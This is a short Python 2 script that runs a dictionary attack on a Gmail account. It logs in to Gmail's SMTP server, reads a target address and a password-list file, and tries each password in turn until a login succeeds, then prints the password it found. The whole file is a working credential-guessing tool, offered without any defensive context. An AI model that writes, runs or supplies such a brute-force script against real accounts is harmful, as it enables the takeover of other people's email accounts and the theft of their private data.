import smtplib
import sys

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.starttls()
user = raw_input(" enter email ")
passwfile = raw_input(" passfile? ")
passwfile = open(passwfile, "r")

for password in passwfile:
  try:
      smtpserver.login(user, password)
      sys.stdout.write("  PASSWORD!!!!!:  %s" % password)
      sys.stdout.flush()
      sys.exit()

  except smtplib.SMTPAuthenticationError:
   sys.stdout.write("no "),
   sys.stdout.flush()